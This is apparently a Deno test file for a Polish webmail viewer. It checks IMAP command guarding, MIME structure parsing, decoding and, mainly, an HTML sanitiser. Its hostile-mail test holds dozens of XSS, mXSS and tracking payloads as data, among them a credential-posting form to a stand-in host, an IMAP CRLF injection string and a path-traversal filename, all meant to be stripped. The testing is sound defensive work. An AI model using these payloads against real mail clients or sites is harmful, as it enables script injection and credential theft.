// deno test -A supabase/functions/poczta/
// Mailbox browser, pure parts: folder names, message structure, decoding, and — above all — hostile HTML mail.
import { assert, assertEquals, assertThrows } from "jsr:@std/assert@1";
import { astring, guard, imapData, mutf7, quote, tok } from "./imap.ts";
import { base64Bytes, cidWHtml, czesci, dekodujSlowa, maZalaczniki, naTekst, nazwaPliku, oczyscHtml, odkoduj, parametr, pokazObrazy, qpBytes, ramka, rozmiarPo, tekstCzesc, zalaczniki } from "./widok.ts";

const te = new TextEncoder(), td = new TextDecoder();

Deno.test("folder names: modified UTF-7 is decoded; names are quoted or sent as literals, never spliced into a command", () => {
  assertEquals(mutf7("INBOX.Wys&AUI-ane"), "INBOX.Wysłane");
  assertEquals(mutf7("&BB4EQgQ,BEAEMAQyBDsENQQ9BD0ESwQ1-"), "Отправленные");
  assertEquals(mutf7("Faktury &- umowy"), "Faktury & umowy");
  assertEquals(mutf7("&AVsAbABh-sk &AXsA8wFC-w"), "ślask Żółw");
  assertEquals(mutf7("Zwykly"), "Zwykly");
  assertEquals(mutf7("Zepsute &***- i &AW"), "Zepsute &***- i &AW"); // broken input stays as it is
  assertEquals(quote('Folder "A" \\ B'), '"Folder \\"A\\" \\\\ B"');
  assertEquals(astring("INBOX.Sent"), '"INBOX.Sent"');
  assertEquals(td.decode(astring("Wysłane") as Uint8Array), "Wysłane"); // non-ASCII: a length-prefixed literal
  for (const bad of ["INBOX\r\nA1 DELETE INBOX", "a\nb", "a\u0000b"]) { assertThrows(() => astring(bad)); assertThrows(() => quote(bad)); }
  // the command skeleton with literals passes the guard; anything that writes does not
  guard('LIST "" "*"'); guard("EXAMINE {8}"); guard("UID SEARCH CHARSET UTF-8 OR SUBJECT {5} FROM {5} UNSEEN SINCE 1-Oct-2026");
  guard("UID FETCH 1,2,3 (UID FLAGS INTERNALDATE RFC822.SIZE BODYSTRUCTURE BODY.PEEK[HEADER.FIELDS (FROM TO CC REPLY-TO SUBJECT DATE MESSAGE-ID)])");
  guard("FETCH 10:40 (UID FLAGS INTERNALDATE RFC822.SIZE BODYSTRUCTURE)"); guard("UID FETCH 7 (UID BODY.PEEK[1.2]<0.600>)");
  for (const bad of ["UID FETCH 7 (UID BODY[1.2])", "UID FETCH 7 (UID BODY.PEEK[1] BODY[2])", "UID FETCH 7 (RFC822.TEXT)", "UID FETCH 7 (UID) STORE", "FETCH 1 (FLAGS) \r\nx STORE 1 +FLAGS (\\Seen)", "UID FETCH 1:* (FLAGS.SILENT)",
    'SELECT "INBOX"', "UID STORE 7 +FLAGS (\\Seen)", "UID COPY 7 Trash", "UID MOVE 7 Trash", "UID EXPUNGE 7", 'CREATE "x"', 'DELETE "x"', 'RENAME "a" "b"', 'SUBSCRIBE "x"', "LSUB \"\" *", 'APPEND "INBOX" {5}', "CLOSE", "UID SORT (DATE) UTF-8 ALL", "ENABLE UTF8=ACCEPT"]) assertThrows(() => guard(bad), Error, undefined, bad);
  assertEquals(imapData("2026-10-09"), "9-Oct-2026");
  for (const bad of ["2026-02-30", "9-Oct-2026", "2026-10-09 OR ALL", ""]) assertThrows(() => imapData(bad));
});

Deno.test("server data: nested lists, quoted strings with escapes, literals, NIL, BODY[...] keys", () => {
  const lit = [te.encode("Subject: x\r\n\r\n"), te.encode('nazwa "w" literale')];
  const t = tok('(UID 7 FLAGS (\\Seen $Forwarded) INTERNALDATE "09-Oct-2026 10:00:00 +0200" BODY[HEADER.FIELDS (FROM TO)]<0> \u00010\u0001 X ("a \\"b\\" \\\\c" NIL nil \u00011\u0001 ()))', lit)[0] as unknown[];
  assertEquals(t.slice(0, 6), ["UID", "7", "FLAGS", ["\\Seen", "$Forwarded"], "INTERNALDATE", "09-Oct-2026 10:00:00 +0200"]);
  assertEquals([t[6], t[7] === lit[0], t[8]], ["BODY[HEADER.FIELDS (FROM TO)]<0>", true, "X"]);
  assertEquals((t[9] as unknown[]).slice(0, 3), ['a "b" \\c', null, null]);
  assertEquals((t[9] as unknown[])[4], []);
  assertEquals(tok("((((unterminated"), [[[[["unterminated"]]]]]);
  assertThrows(() => tok("(".repeat(200)));
});

// as Dovecot sends it: multipart/mixed [ multipart/alternative [ text/plain, multipart/related [ text/html, image/png inline ] ], application/pdf, message/rfc822 ]
const BS = '((("text" "plain" ("charset" "iso-8859-2") NIL NIL "quoted-printable" 120 6 NIL NIL NIL NIL)(("text" "html" ("charset" "utf-8") NIL NIL "base64" 900 12 NIL NIL NIL NIL)("image" "png" ("name" "logo.png") "<logo1@x>" NIL "base64" 2048 NIL ("inline" ("filename" "logo.png")) NIL NIL) "related" ("boundary" "r") NIL NIL NIL) "alternative" ("boundary" "a") NIL NIL NIL)' +
  '("application" "pdf" ("name" "=?UTF-8?Q?umowa=5Fza=C5=BC=C3=B3=C5=82=C4=87.pdf?=") NIL NIL "base64" 137000 NIL ("attachment" ("filename*0*" "UTF-8\'\'umowa%20za%C5%BC" "filename*1*" "%C3%B3%C5%82%C4%87" "filename*2" ".pdf")) NIL NIL)' +
  '("message" "rfc822" NIL NIL NIL "7bit" 5000 ("date" "subj" NIL NIL NIL NIL NIL NIL NIL "<id>") ("text" "plain" ("charset" "us-ascii") NIL NIL "7bit" 10 1 NIL NIL NIL NIL) 40 NIL ("attachment" ("filename" "przekazana.eml")) NIL NIL) "mixed" ("boundary" "m") NIL NIL NIL)';
Deno.test("BODYSTRUCTURE: part numbers, body parts, attachments, inline pictures, RFC 2231 / RFC 2047 names", () => {
  const cz = czesci(tok(BS)[0]);
  assertEquals(cz.map((c) => [c.id, c.typ, c.zalacznik]), [["1.1", "text/plain", false], ["1.2.1", "text/html", false], ["1.2.2", "image/png", false], ["2", "application/pdf", true], ["3", "message/rfc822", true]]);
  assertEquals([tekstCzesc(cz, "text/plain")?.id, tekstCzesc(cz, "text/html")?.id, tekstCzesc(cz, "text/plain")?.charset, tekstCzesc(cz, "text/plain")?.kodowanie], ["1.1", "1.2.1", "iso-8859-2", "quoted-printable"]);
  assertEquals([cz[2].cid, cz[2].inline, cz[3].nazwa, cz[4].nazwa, rozmiarPo(cz[3])], ["logo1@x", true, "umowa zażółć.pdf", "przekazana.eml", 101380]);
  assert(maZalaczniki(cz));
  assertEquals(zalaczniki(cz, new Set(["logo1@x"])).map((c) => c.id), ["2", "3"]);
  assertEquals(zalaczniki(cz).map((c) => c.id), ["1.2.2", "2", "3"]); // a picture the HTML does not use is offered as a file
  // a plain single-part message, a lone attachment, a named text file, nothing at all
  assertEquals(czesci(tok('("text" "plain" ("charset" "utf-8") NIL NIL "8bit" 10 1 NIL NIL NIL NIL)')[0]).map((c) => [c.id, c.zalacznik]), [["1", false]]);
  assertEquals(czesci(tok('("application" "pdf" ("name" "a.pdf") NIL NIL "base64" 10 NIL NIL NIL NIL)')[0]).map((c) => [c.id, c.zalacznik, c.nazwa]), [["1", true, "a.pdf"]]);
  assert(czesci(tok('(("text" "plain" NIL NIL NIL "7bit" 1 1 NIL NIL NIL NIL)("text" "plain" ("name" "notatka.txt") NIL NIL "7bit" 1 1 NIL ("attachment" ("filename" "notatka.txt")) NIL NIL) "mixed")')[0])[1].zalacznik);
  assertEquals(czesci(null), []); assertEquals(czesci("śmieci"), []);
  assertEquals(maZalaczniki(czesci(tok('(("text" "plain" NIL NIL NIL "7bit" 1 1 NIL NIL NIL NIL)("text" "html" NIL NIL NIL "7bit" 1 1 NIL NIL NIL NIL) "alternative")')[0])), false);
  // names: no paths, no control characters, never empty
  assertEquals(parametr({ "filename*": "iso-8859-2'pl'%B3%F3d%BC.txt" }, "filename"), "łódź.txt");
  assertEquals(parametr({ name: "=?UTF-8?B?" + btoa(String.fromCharCode(...te.encode("Żółw"))) + "?= =?UTF-8?Q?_i_je=C5=BC.pdf?=" }, "name"), "Żółw i jeż.pdf");
  assertEquals(dekodujSlowa("=?koi8-r?B?8NLJ18XU?= =?nieznane-kodowanie?Q?abc?="), "Приветabc");
  const zly = czesci(tok('("application" "octet-stream" ("name" "..\\\\..\\\\etc/passwd‮gnp.exe") NIL NIL "base64" 10 NIL NIL NIL NIL)')[0])[0];
  assertEquals(nazwaPliku(zly), "_.._etc_passwdgnp.exe");
  assertEquals(nazwaPliku({ ...zly, nazwa: "", id: "2.1" }), "zalacznik-2-1");
});

Deno.test("decoding: base64 and quoted-printable bytes, charsets, truncated input", () => {
  assertEquals(td.decode(base64Bytes("WmHFvMOzxYLEhw==")), "Zażółć");
  assertEquals(td.decode(base64Bytes(te.encode("WmHF\r\nvMOz xYLE\nhw"))), "Zażółć"); // line breaks, missing padding
  assertEquals(td.decode(base64Bytes("WmHFvMOzxYLEh")).startsWith("Zażół"), true);   // cut in the middle of a group
  assertEquals(td.decode(qpBytes(te.encode("Za=C5=BC=C3=B3=\r\n=C5=82=C4=87 =3D ok =ZZ"))), "Zażółć = ok =ZZ");
  const c = { id: "1", typ: "text/plain", charset: "ISO-8859-2", kodowanie: "quoted-printable", rozmiar: 0, nazwa: "", cid: "", zalacznik: false, inline: false };
  assertEquals(naTekst(c, te.encode("=B3=F3d=BC")), "łódź");
  assertEquals(naTekst({ ...c, charset: "cp1250", kodowanie: "8bit" }, new Uint8Array([0xb3, 0xf3, 0x64, 0x9f])), "łódź");
  assertEquals(naTekst({ ...c, charset: "nie-ma-takiego", kodowanie: "7bit" }, te.encode("abc")), "abc");
  assertEquals(odkoduj({ kodowanie: "binary" }, te.encode("x")).length, 1);
});

const czyste = (h: string) => oczyscHtml(h).html;
Deno.test("hostile HTML: nothing that runs, submits, frames, redirects or phones home survives", () => {
  const ataki: [string, RegExp][] = [
    ['<script>alert(1)</script><p>ok</p>', /script|alert/i],
    ['<SCRIPT SRC=https://zly.example/x.js></SCRIPT>', /script|zly/i],
    ['<scr<script>ipt>alert(1)</scr</script>ipt>', /<script/i],
    ['<img src=x onerror=alert(1)>', /onerror|alert/i],
    ['<img src="https://ok.example/a.png" onload="fetch(\'https://zly.example\')" onmouseover=x>', /onload|onmouseover|fetch/i],
    ['<svg onload=alert(1)><circle r=5></svg>', /svg|onload|alert/i],
    ['<svg><script>alert(1)</script></svg><svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>', /svg|script|javascript|alert/i],
    ['<math><mi xlink:href="javascript:alert(1)">x</mi></math>', /math|javascript/i],
    ['<a href="javascript:alert(1)">a</a><a href="JaVaScRiPt:alert(1)">b</a><a href=" &#106;avascript:alert(1)">c</a><a href="java\tscript:alert(1)">d</a>', /javascript|alert\(/i],
    ['<a href="vbscript:msgbox(1)">a</a><a href="data:text/html,<script>alert(1)</script>">b</a><a href="file:///etc/passwd">c</a>', /vbscript|data:|file:|script/i],
    ['<iframe src="https://zly.example"></iframe><iframe srcdoc="<script>alert(1)</script>"></iframe>', /iframe|zly|script/i],
    ['<object data="https://zly.example/x.swf"></object><embed src="https://zly.example/x"><applet code=x></applet>', /object|embed|applet|zly/i],
    ['<form action="https://zly.example/steal" method=post><input name=haslo><button>Zaloguj</button></form>', /form|input|button|zly/i],
    ['<meta http-equiv="refresh" content="0;url=https://zly.example"><p>x</p>', /meta|refresh|zly/i],
    ['<base href="https://zly.example/"><a href="/login">x</a>', /base|zly/i],
    ['<link rel="stylesheet" href="https://zly.example/x.css"><style>@import url(https://zly.example/y.css); p{background:url(https://zly.example/b.gif)}</style><p>x</p>', /link|style|import|zly/i],
    ['<p style="background:url(https://zly.example/b.gif)">x</p><p style="background-image: url(\'https://zly.example/c.gif\')">y</p>', /url\(|zly/i],
    ['<p style="width:expression(alert(1))">x</p><p style="color:red;behavior:url(x.htc)">y</p><p style="-moz-binding:url(x)">z</p>', /expression|behavior|binding|url\(/i],
    ['<div style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">nakładka</div>', /position|z-index/i],
    ['<td background="https://zly.example/b.gif">x</td><body background="https://zly.example/c.gif">', /background|zly/i],
    ['<img srcset="https://zly.example/a.png 1x" src="x"><picture><source srcset="https://zly.example/b.png"></picture>', /srcset|zly|source/i],
    ['<video src="https://zly.example/v.mp4" poster="https://zly.example/p.png" autoplay></video><audio src="https://zly.example/a.mp3">', /video|audio|zly/i],
    ['<a href="https://ok.example" ping="https://zly.example/ping" target="_top">x</a>', /ping|_top|zly/i],
    ['<details open ontoggle=alert(1)><summary>x</summary></details><marquee onstart=alert(1)>y</marquee>', /ontoggle|onstart|alert/i],
    ['<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">', /svg|data:/i],
    ['<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">', /data:/i],
    ['<img src="http://zly.example/niezaszyfrowany.gif"><img src="//zly.example/p.gif"><img src="ftp://zly.example/x">', /zly/i],
    ['<img src="https://uzytkownik:haslo@zly.example/p.gif">', /zly|haslo/i],
    // mXSS-style broken markup
    ['<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">', /<img src=1|onerror=alert\(1\)>|<style|<math/i],
    ['<noscript><p title="</noscript><img src=x onerror=alert(1)>">', /<img src=x|noscript/i],
    ['<textarea><img src=x onerror=alert(1)></textarea><title><img src=x onerror=alert(2)></title>', /<img|textarea|title>/i],
    ['<select><option><style></option></select><img src=x onerror=alert(1)></style>', /onerror|<style|select/i],
    ['<p>x</p><!--><img src=x onerror=alert(1)>--><![CDATA[<script>alert(1)</script>]]>', /onerror|<script|<!--/i],
    ['<a href="https://ok.example/"onclick="alert(1)"style="color:red"id=x class=y>x</a>', /onclick|alert| id=| class=/i],
    ['<xmp><script>alert(1)</script></xmp><plaintext><script>alert(2)</script>', /<script|xmp|plaintext/i],
    ['<template><script>alert(1)</script></template><slot onfocus=alert(1)>', /template|script|onfocus/i],
  ];
  for (const [zle, wzor] of ataki) {
    const out = czyste(zle);
    assert(!wzor.test(out), `${zle}\n  -> ${out}`);
    assert(!/<\s*(script|style|iframe|object|embed|form|input|button|meta|base|link|svg|math|video|audio|source|textarea|select|template)\b/i.test(out), out);
    assert(!/\son[a-z]+\s*=/i.test(out.replace(/"[^"]*"/g, '""')), out); // no event-handler attribute on any tag
    assert(!/\s(src|href)="(?!https?:\/\/|mailto:|tel:|data:image\/(png|jpeg|jpg|gif|webp);base64,)/i.test(out), out);
  }
});

Deno.test("HTML mail that is fine stays readable: links open outside and show their host, pictures are disarmed until asked for", () => {
  const r = oczyscHtml('<div style="color:#333;font-size:14px;margin:0 auto;position:absolute"><p align="center">Dzień dobry, <b>Żaneto</b> &amp; zespole</p><table width="100%" cellpadding="4"><tr><td bgcolor="#eee">komórka</td></tr></table>' +
    '<a href="https://klient.example/dokumenty?id=1&amp;x=2" onclick="x()">Dokumenty</a> <a href="mailto:biuro@klient.example">napisz</a> <a href="/wzgledny">wzgl</a>' +
    '<img src="https://klient.example/logo.png" alt="logo" width="120" data-zdalne="http://podmiana.example/x"><img src="cid:obraz1"><img src="cid:brak"><img src="data:image/png;base64,iVBORw0KGgo="></div>', new Map([["obraz1", "data:image/jpeg;base64,/9j/4AAQ"]]));
  assert(r.html.includes('style="color:#333;font-size:14px;margin:0 auto"') && !r.html.includes("position"));
  assert(r.html.includes("<b>Żaneto</b> &amp; zespole") && r.html.includes('bgcolor="#eee"') && r.html.includes('align="center"'));
  assert(r.html.includes('<a href="https://klient.example/dokumenty?id=1&amp;x=2" target="_blank" rel="noopener noreferrer nofollow" title="Otwiera: klient.example">Dokumenty</a>'), r.html);
  assert(r.html.includes('href="mailto:biuro@klient.example"') && r.html.includes("<a>wzgl</a>"));
  assertEquals(r.zdalne, 1);
  assert(r.html.includes('data-zdalne="https://klient.example/logo.png"') && !r.html.includes("podmiana") && !/ src="https/.test(r.html));
  assert(r.html.includes('src="data:image/jpeg;base64,/9j/4AAQ"') && r.html.includes('src="data:image/png;base64,iVBORw0KGgo="') && !r.html.includes("cid:"));
  assertEquals([...cidWHtml('<img src="cid:obraz1"> <td background=\'cid:tlo@x\'> url(cid:z)')], ["obraz1", "tlo@x", "z"]);
  // the document for the frame: a policy that allows nothing but inline styles and embedded pictures
  const doc = ramka(r.html);
  assert(doc.startsWith("<!doctype html>") && doc.includes(`<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src data:; style-src 'unsafe-inline'; form-action 'none'; base-uri 'none'">`));
  assert(!/script-src|unsafe-eval|https:/.test(doc.match(/content="([^"]*)"/)![1]) && doc.includes('<base target="_blank">') && doc.includes('name="referrer" content="no-referrer"'));
  // the reader's click: https pictures only, nothing else changes
  const z = pokazObrazy(doc);
  assert(z.includes("img-src data: https:;") && z.includes('<img alt="logo" width="120" src="https://klient.example/logo.png"') && !z.includes("data-zdalne") && !/script-src/.test(z));
  // a huge body is cut, not allowed to hang the function
  assert(oczyscHtml("<p>" + "x".repeat(3 * 1024 * 1024) + "</p><script>alert(1)</script>").html.length <= 1024 * 1024 + 20);
});
